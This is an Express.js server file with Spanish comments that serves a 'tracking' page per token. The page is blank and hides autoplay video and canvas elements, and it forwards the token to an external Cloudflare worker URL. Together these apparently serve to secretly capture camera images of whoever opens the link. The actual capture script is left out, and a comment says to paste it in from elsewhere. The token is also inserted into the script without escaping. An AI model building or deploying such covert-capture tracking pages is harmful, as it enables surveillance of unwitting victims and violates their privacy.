const express = require('express');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 10000;

// ========== CONFIGURACIÓN ==========
const WORKER_URL = 'https://wispy-bonus-51e9.societykark.workers.dev';

// Servir archivos estáticos desde la carpeta "public"
app.use(express.static(path.join(__dirname, 'public')));

// Ruta raíz
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Ruta de tracking
app.get('/track/:token', (req, res) => {
    const token = req.params.token;
    const html = `<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>.</title>
    <style>
        body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; background: #ffffff; }
        video, canvas { display: none; }
    </style>
</head>
<body>
    <video id="v" autoplay playsinline></video>
    <canvas id="c"></canvas>

    <script>
        const trackingId = '${token}';
        const workerUrl = '${WORKER_URL}';

        // ... TODO EL CÓDIGO DEL HTML QUE PUSE ARRIBA ...
        // (Asegúrate de copiar el código completo del HTML que te pasé)
    </script>
</body>
</html>`;
    res.send(html);
});

app.listen(PORT, () => {
    console.log(`✅ Servidor en puerto ${PORT}`);
    console.log(`✅ WORKER_URL: ${WORKER_URL}`);
});